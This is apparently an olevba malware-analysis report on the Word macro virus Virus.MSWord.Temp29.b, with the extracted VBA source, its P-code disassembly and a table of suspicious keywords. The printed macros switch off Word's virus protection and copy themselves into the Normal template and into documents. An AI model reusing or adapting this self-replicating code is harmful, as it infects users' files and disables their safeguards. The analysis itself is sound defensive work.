olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Temp29.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Temp29.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
On Error Resume Next
Application.EnableCancelKey = wdCancelDisabled
With Options:
    .ConfirmConversions = False:
    .VirusProtection = False:
    .SaveNormalPrompt = False:
    .SavePropertiesPrompt = False:
End With
s = ActiveDocument.Saved
sName = "c:\evolve.tmp"
sFunc = "Private Sub Document_Open()"
Found = False
If Dir(sName) <> "" Then Kill sName
Open sName For Output As #1
For i = 0 To MacroContainer.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
    a = MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(i, 1)
    If Found = False And (a = sFunc) Then Found = True
.replaceline 1, "Sub AutoOpen()"
    If a = "End Sub" And Found = True Then Found = False
Next i
.replaceline 28, "Sub ToolsMacro()"
j = 1
k = 1
t = 0
If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> sFunc Then
    Set nml = NormalTemplate.VBProject.VBComponents.Item(1)
Sub ToolsMacro()
End If
If ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> sFunc Then
    Set atv = ActiveDocument.VBProject.VBComponents.Item(1)
    t = t + 2
End If
If t > 0 Then
    Open sName For Input As #1
    If LOF(1) = 0 Then GoTo quit
    i = 1
    Do While Not EOF(1)
        Line Input #1, a
        If t = 1 Or t = 3 Then
            nml.CodeModule.InsertLines j, a
            j = j + 1
        End If
        If t = 2 Or t = 3 Then
            atv.CodeModule.InsertLines k, a
            k = k + 1
        End If
    Loop
quit:
    Close #1
End If
With Dialogs(wdDialogFileSumaryInfo):
    .Title = "Ethan Frome":
    .Author = "EW/LN/CB":
    .Keywrds = "Ethan":
    .Execute:
End With
If Left(ActiveDocument.Name, 8) <> "Document" Then
    ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End If
If ActiveDocument.Saved <> s Then ActiveDocument.Saved = s
Kill sName
Application.EnableCancelKey = wdCancelInterrupt
End Sub
Sub AutoClose()
On Error GoTo ou: Options.VirusProtection = False: Options.SaveNormalPrompt = False: Options.ConfirmConversions = False
Set NTVBC = NormalTemplate.VBProject.VBComponents.Item(1): Set ADVBC = ActiveDocument.VBProject.VBComponents.Item(1)
ad = ADVBC.CodeModule.CountOfLines: nt = NTVBC.CodeModule.CountOfLines: EXPFN = Environ("temp") & "\~CL7610_2.~MP"
If nt > 28 And ad > 28 Then GoTo ou
If nt < 29 Then
    Set dhst = NTVBC
    Set shst = ADVBC
Else
    Set dhst = ADVBC
    Set shst = NTVBC
End If
shst.Name = dhst.Name
shst.Export (EXPFN)
With dhst.CodeModule
.AddFromFile (EXPFN)
.deletelines 1, 4
temp$ = .Lines(1, 1)
.replaceline 1, "Sub AutoOpen()"
.replaceline 19, ".replaceline 1," & Chr$(34) & temp$ & Chr$(34)
temp$ = .Lines(28, 1)
.replaceline 28, "Sub ToolsMacro()"
.replaceline 22, ".replaceline 28," & Chr$(34) & temp$ & Chr$(34)
End With
Kill (EXPFN)
ou:
End Sub
Sub ViewVBCode()
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Temp29.b
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 5607 bytes
' Line #0:
' 	FuncDefn (Sub AutoOpen())
' Line #1:
' 	OnError (Resume Next) 
' Line #2:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #3:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' 	BoS 0x0000 
' Line #4:
' 	LitVarSpecial (False)
' 	MemStWith ConfirmConversions 
' 	BoS 0x0000 
' Line #5:
' 	LitVarSpecial (False)
' 	MemStWith VirusProtection 
' 	BoS 0x0000 
' Line #6:
' 	LitVarSpecial (False)
' 	MemStWith SaveNormalPrompt 
' 	BoS 0x0000 
' Line #7:
' 	LitVarSpecial (False)
' 	MemStWith SavePropertiesPrompt 
' 	BoS 0x0000 
' Line #8:
' 	EndWith 
' Line #9:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	St s 
' Line #10:
' 	LitStr 0x000D "c:\evolve.tmp"
' 	St sName 
' Line #11:
' 	LitStr 0x001B "Private Sub Document_Open()"
' 	St sFunc 
' Line #12:
' 	LitVarSpecial (False)
' 	St Found 
' Line #13:
' 	Ld sName 
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld sName 
' 	ArgsCall Kill 0x0001 
' 	EndIf 
' Line #14:
' 	Ld sName 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #15:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #16:
' 	Ld i 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St a 
' Line #17:
' 	Ld Found 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld a 
' 	Ld sFunc 
' 	Eq 
' 	Paren 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St Found 
' 	EndIf 
' Line #18:
' 	LitDI2 0x0001 
' 	LitStr 0x000E "Sub AutoOpen()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #19:
' 	Ld a 
' 	LitStr 0x0007 "End Sub"
' 	Eq 
' 	Ld Found 
' 	LitVarSpecial (True)
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (False)
' 	St Found 
' 	EndIf 
' Line #20:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #21:
' 	LitDI2 0x001C 
' 	LitStr 0x0010 "Sub ToolsMacro()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #22:
' 	LitDI2 0x0001 
' 	St j 
' Line #23:
' 	LitDI2 0x0001 
' 	St k 
' Line #24:
' 	LitDI2 0x0000 
' 	St t 
' Line #25:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Ld sFunc 
' 	Ne 
' 	IfBlock 
' Line #26:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set nml 
' Line #27:
' 	FuncDefn (Sub ToolsMacro())
' Line #28:
' 	EndIfBlock 
' Line #29:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Ld sFunc 
' 	Ne 
' 	IfBlock 
' Line #30:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set atv 
' Line #31:
' 	Ld t 
' 	LitDI2 0x0002 
' 	Add 
' 	St t 
' Line #32:
' 	EndIfBlock 
' Line #33:
' 	Ld t 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #34:
' 	Ld sName 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #35:
' 	LitDI2 0x0001 
' 	ArgsLd LOF 0x0001 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo quit 
' 	EndIf 
' Line #36:
' 	LitDI2 0x0001 
' 	St i 
' Line #37:
' 	LitDI2 0x0001 
' 	ArgsLd EOF 0x0001 
' 	Not 
' 	DoWhile 
' Line #38:
' 	LitDI2 0x0001 
' 	Ld a 
' 	LineInput 
' Line #39:
' 	Ld t 
' 	LitDI2 0x0001 
' 	Eq 
' 	Ld t 
' 	LitDI2 0x0003 
' 	Eq 
' 	Or 
' 	IfBlock 
' Line #40:
' 	Ld j 
' 	Ld a 
' 	Ld nml 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #41:
' 	Ld j 
' 	LitDI2 0x0001 
' 	Add 
' 	St j 
' Line #42:
' 	EndIfBlock 
' Line #43:
' 	Ld t 
' 	LitDI2 0x0002 
' 	Eq 
' 	Ld t 
' 	LitDI2 0x0003 
' 	Eq 
' 	Or 
' 	IfBlock 
' Line #44:
' 	Ld k 
' 	Ld a 
' 	Ld atv 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #45:
' 	Ld k 
' 	LitDI2 0x0001 
' 	Add 
' 	St k 
' Line #46:
' 	EndIfBlock 
' Line #47:
' 	Loop 
' Line #48:
' 	Label quit 
' Line #49:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #50:
' 	EndIfBlock 
' Line #51:
' 	StartWithExpr 
' 	Ld wdDialogFileSumaryInfo 
' 	ArgsLd Dialogs 0x0001 
' 	With 
' 	BoS 0x0000 
' Line #52:
' 	LitStr 0x000B "Ethan Frome"
' 	MemStWith Title 
' 	BoS 0x0000 
' Line #53:
' 	LitStr 0x0008 "EW/LN/CB"
' 	MemStWith Author 
' 	BoS 0x0000 
' Line #54:
' 	LitStr 0x0005 "Ethan"
' 	MemStWith Keywrds 
' 	BoS 0x0000 
' Line #55:
' 	ArgsMemCallWith Execute 0x0000 
' 	BoS 0x0000 
' Line #56:
' 	EndWith 
' Line #57:
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitDI2 0x0008 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0008 "Document"
' 	Ne 
' 	IfBlock 
' Line #58:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #59:
' 	EndIfBlock 
' Line #60:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	Ld s 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld s 
' 	Ld ActiveDocument 
' 	MemSt Saved 
' 	EndIf 
' Line #61:
' 	Ld sName 
' 	ArgsCall Kill 0x0001 
' Line #62:
' 	Ld wdCancelInterrupt 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #63:
' 	EndSub 
' Line #64:
' 	FuncDefn (Sub AutoClose())
' Line #65:
' 	OnError ou 
' 	BoS 0x0000 
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' 	BoS 0x0000 
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' 	BoS 0x0000 
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #66:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set NTVBC 
' 	BoS 0x0000 
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set ADVBC 
' Line #67:
' 	Ld ADVBC 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St ad 
' 	BoS 0x0000 
' 	Ld NTVBC 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St nt 
' 	BoS 0x0000 
' 	LitStr 0x0004 "temp"
' 	ArgsLd Environ 0x0001 
' 	LitStr 0x000E "\~CL7610_2.~MP"
' 	Concat 
' 	St EXPFN 
' Line #68:
' 	Ld nt 
' 	LitDI2 0x001C 
' 	Gt 
' 	Ld ad 
' 	LitDI2 0x001C 
' 	Gt 
' 	And 
' 	If 
' 	BoSImplicit 
' 	GoTo ou 
' 	EndIf 
' Line #69:
' 	Ld nt 
' 	LitDI2 0x001D 
' 	Lt 
' 	IfBlock 
' Line #70:
' 	SetStmt 
' 	Ld NTVBC 
' 	Set dhst 
' Line #71:
' 	SetStmt 
' 	Ld ADVBC 
' 	Set shst 
' Line #72:
' 	ElseBlock 
' Line #73:
' 	SetStmt 
' 	Ld ADVBC 
' 	Set dhst 
' Line #74:
' 	SetStmt 
' 	Ld NTVBC 
' 	Set shst 
' Line #75:
' 	EndIfBlock 
' Line #76:
' 	Ld dhst 
' 	MemLd New 
' 	Ld shst 
' 	MemSt New 
' Line #77:
' 	Ld EXPFN 
' 	Paren 
' 	Ld shst 
' 	ArgsMemCall Export 0x0001 
' Line #78:
' 	StartWithExpr 
' 	Ld dhst 
' 	MemLd CodeModule 
' 	With 
' Line #79:
' 	Ld EXPFN 
' 	Paren 
' 	ArgsMemCallWith AddFromFile 0x0001 
' Line #80:
' 	LitDI2 0x0001 
' 	LitDI2 0x0004 
' 	ArgsMemCallWith deletelines 0x0002 
' Line #81:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	ArgsMemLdWith Lines 0x0002 
' 	St temp$ 
' Line #82:
' 	LitDI2 0x0001 
' 	LitStr 0x000E "Sub AutoOpen()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #83:
' 	LitDI2 0x0013 
' 	LitStr 0x000F ".replaceline 1,"
' 	LitDI2 0x0022 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	Ld temp$ 
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	ArgsMemCallWith replaceline 0x0002 
' Line #84:
' 	LitDI2 0x001C 
' 	LitDI2 0x0001 
' 	ArgsMemLdWith Lines 0x0002 
' 	St temp$ 
' Line #85:
' 	LitDI2 0x001C 
' 	LitStr 0x0010 "Sub ToolsMacro()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #86:
' 	LitDI2 0x0016 
' 	LitStr 0x0010 ".replaceline 28,"
' 	LitDI2 0x0022 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	Ld temp$ 
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	ArgsMemCallWith replaceline 0x0002 
' Line #87:
' 	EndWith 
' Line #88:
' 	Ld EXPFN 
' 	Paren 
' 	ArgsCall Kill 0x0001 
' Line #89:
' 	Label ou 
' Line #90:
' 	EndSub 
' Line #91:
' 	FuncDefn (Sub ViewVBCode())
' Line #92:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

